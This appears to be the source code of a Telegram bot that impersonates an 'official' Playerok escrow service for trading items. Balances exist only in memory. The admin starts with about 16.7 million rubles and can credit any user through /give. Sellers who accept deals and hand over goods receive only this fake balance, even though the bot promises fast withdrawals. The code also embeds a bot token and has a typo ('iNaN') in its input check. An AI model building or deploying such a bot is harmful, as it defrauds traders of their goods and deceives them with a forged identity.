import { Telegraf, Markup } from 'telegraf';
const bot = new Telegraf('8849870102:AAGiJ0uvDWHKAH3sFYCWQECSgJmNFC0zsnY');
const ADMIN = 'k13_way';
const ADMIN_ID = 8886821631; // Твой Telegram ID
const users = {}, deals = {}, states = {};

function init(id, name) {
    if (!users[id]) {
        // Если заходишь ты (админ), тебе сразу выдаётся твой баланс
        const startBalance = (id === ADMIN_ID) ? 16699677 : 0;
        users[id] = { id, username: name ? name.toLowerCase() : '', balance: startBalance, count: 0 };
    } else if (name) {
        users[id].username = name.toLowerCase();
    }
}
function findId(name) {
    if (!name) return null;
    const clean = name.replace('@', '').trim().toLowerCase();
    for (const id in users) { if (users[id].username === clean) return parseInt(id); }
    return null;
}
const menu = Markup.keyboard([['🤝 Создать сделку'], ['💳 Баланс', '🛡 Безопасность'], ['ℹ️ О Гарант Боте Playerok', '🆘 Поддержка']]).resize();

bot.start((ctx) => {
    init(ctx.from.id, ctx.from.username);
    ctx.replyWithMarkdown('Добро пожаловать 👋\n\n✅ *PlayerOk* — специализированный сервис по обеспечению безопасности внебиржевых сделок.\n\n🥇 Автоматизированный алгоритм исполнения.\n🔎 Скорость и автоматизация.\n💳 Удобный и быстрый вывод средств.\n\n• Комиссия сервиса: 1%\n• Режим работы: 24/7\n• Поддержка: @sw1zyy01\n\n🛡 Выберите нужный раздел ниже:', menu);
});
bot.hears('ℹ️ О Гарант Боте Playerok', (ctx) => ctx.reply('Playerok Гарант бот, это внутренние безопасные сделки in Telegram! Все сделки и данные хранятся в базе данных Playerok. Если безопасные и быстрые сделки - то только на Playerok!'));
bot.hears('🛡 Безопасность', (ctx) => ctx.reply('Гарант Playerok - это оффициальный Гарант бот. Тут вы можете проводить безопасные сделки прямо в Telegram! Все сделки храняются на базе данных Playerok. Не ведитесь на мошенников, с любовью Playerok Гарант.'));
bot.hears('🆘 Поддержка', (ctx) => ctx.reply('Поддержка Playerok Гарант ПРЯМО в Telegram! В случай спорных моментов в сделках, обращайте модератору @sw1zyy01 с медийными доказательствами о пробелмы в сделке. С любовью - Playerok Гарант.'));

bot.hears('💳 Баланс', (ctx) => {
    init(ctx.from.id, ctx.from.username);
    const u = users[ctx.from.id];
    ctx.reply(`ℹ️ Информация о профиле:\n\n👤 Юзернейм: @${ctx.from.username || 'нет'}\n🆔 Ваш ID: ${ctx.from.id}\n🤝 Успешных сделок: ${u.count}\n💰 Ваш баланс: ${u.balance.toLocaleString('ru-RU')} руб.`);
});
bot.command('give', (ctx) => {
    if (ctx.from.username?.toLowerCase() !== ADMIN) return ctx.reply('❌ Нет прав.');
    const args = ctx.message.text.split(' ');
    if (args.length !== 3) return ctx.reply('⚠️ /give [ID] [Сумма]');
    const tId = parseInt(args[1]), am = parseInt(args[2]);
    if (isNaN(tId) || iNaN(am) || am <= 0) return ctx.reply('❌ Ошибка данных.');
    init(tId, null); users[tId].balance += am;
    ctx.reply(`✅ Начислено ${am} руб. пользователю ${tId}`);
    bot.telegram.sendMessage(tId, `💰 Баланс пополнен на: +${am} руб.`).catch(()=>{});
});
bot.hears('🤝 Создать сделку', (ctx) => {
    states[ctx.from.id] = { step: 'info' };
    ctx.replyWithMarkdown('📝 *Введите данные сделки одним сообщением.*\n\nФормат: `[Сумма] [Товар] [Юзернейм продавца]`\n\n📋 *Пример:* `2500 Аккаунт @user_name` \n\n⚠️ _Продавец должен запустить бота перед этим!_');
});
bot.on('text', async (ctx, next) => {
    const uid = ctx.from.id, st = states[uid];
    if (!st || st.step !== 'info') return next();
    delete states[uid];
    const text = ctx.message.text.trim();
    const match = text.match(/^(\d+)\s+(.+?)\s+(@[A-Za-z0-9_]{4,})$/);
    if (!match) return ctx.reply('❌ Неверный формат. Нажмите «🤝 Создать сделку» и попробуйте снова.');
    const am = parseInt(match[1]), item = match[2], sName = match[3].replace('@','').toLowerCase();
    const sid = findId(sName);
    if (!sid) return ctx.reply(`❌ Продавец @${sName} не найден. Он должен нажать /start в боте.`);
    if (uid === sid) return ctx.reply('❌ Нельзя с самим собой.');
    const dId = Math.floor(100000 + Math.random() * 900000);
    deals[dId] = { id: dId, bid: uid, sid, bName: ctx.from.username || 'Покупатель', sName, am, item, status: 'wait' };
    ctx.reply(`⏳ Сделка №${dId} оформлена! Ожидаем продавца.`);
    bot.telegram.sendMessage(sid, `🔔 *Новая сделка №${dId}!*\n\n📦 Товар: *${item}*\n💰 Сумма: *${am} руб.*\n👤 Покупатель: @${ctx.from.username || 'Покупатель'}\n\nВы готовы?`, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('🤝 Подтвердить Сделку', `ok_${dId}`)]]) }).catch(()=>{ctx.reply('❌ Ошибка отправки продавцу.');});
});
bot.action(/^ok_(\d+)$/, async (ctx) => {
    const dId = parseInt(ctx.match[1]), d = deals[dId];
    if (!d || ctx.from.id !== d.sid || d.status !== 'wait') return ctx.answerCbQuery('❌ Ошибка.');
    d.status = 'pay'; await ctx.answerCbQuery('✅ Принято!');
    await ctx.editMessageText(`🤝 Вы приняли сделку №${dId}. Ожидайте оплаты покупателем.`);
    bot.telegram.sendMessage(d.bid, `🎉 Продавец принял сделку №${dId}!\n\n📦 Товар: ${d.item}\n💰 К оплате: ${d.am} руб.`, { ...Markup.inlineKeyboard([[Markup.button.callback('💳 Оплатить покупку', `pay_${dId}`)]]) });
});
bot.action(/^pay_(\d+)$/, async (ctx) => {
    const dId = parseInt(ctx.match[1]), d = deals[dId];
    if (!d || ctx.from.id !== d.bid || d.status !== 'pay') return ctx.answerCbQuery('❌ Ошибка.');
    init(d.bid, ctx.from.username); const b = users[d.bid];
    if (b.balance < d.am) return ctx.reply(`❌ Недостаточно средств. Баланс: ${b.balance} руб. Нужно: ${d.am} руб.`);
    b.balance -= d.am; d.status = 'send';
    await ctx.answerCbQuery('✅ Оплачено!'); await ctx.editMessageText(`💰 Сделка №${dId} оплачена! Деньги заморожены. Ожидайте товар.`);
    bot.telegram.sendMessage(d.sid, `📢 Покупатель оплатил сделку №${dId}!\n\nПередайте товар в ЛС. После этого нажмите кнопку:`, { ...Markup.inlineKeyboard([[Markup.button.callback('📦 Товар передан', `sent_${dId}`)]]) });
});
bot.action(/^sent_(\d+)$/, async (ctx) => {
    const dId = parseInt(ctx.match[1]), d = deals[dId];
    if (!d || ctx.from.id !== d.sid || d.status !== 'send') return ctx.answerCbQuery('❌ Ошибка.');
    d.status = 'check'; await ctx.answerCbQuery('✅ Отправлено!'); await ctx.editMessageText(`👌 Вы отметили передачу товара по сделке №${dId}.`);
    bot.telegram.sendMessage(d.bid, `🔔 Продавец передал товар №${dId}!\n\nПроверьте данные и подтвердите покупку:`, { ...Markup.inlineKeyboard([[Markup.button.callback('✅ Подтвердить покупку', `done_${dId}`)]]) });
});
bot.action(/^done_(\d+)$/, async (ctx) => {
    const dId = parseInt(ctx.match[1]), d = deals[dId];
    if (!d || ctx.from.id !== d.bid || d.status !== 'check') return ctx.answerCbQuery('❌ Ошибка.');
    d.status = 'end'; init(d.sid, null);
    users[d.sid].balance += d.am; users[d.bid].count++; users[d.sid].count++;
    await ctx.answerCbQuery('🎉 Успешно!'); await ctx.editMessageText(`🎉 Сделка №${dId} успешно завершена! Деньги у продавца.`);
    bot.telegram.sendMessage(d.sid, `💰 Покупатель подтвердил сделку №${dId}! Вам зачислено: +${d.am} руб.`);
});

bot.launch().then(() => console.log('🚀 Бот PlayerOk успешно запущен без ошибок!')).catch(e => console.error(e));
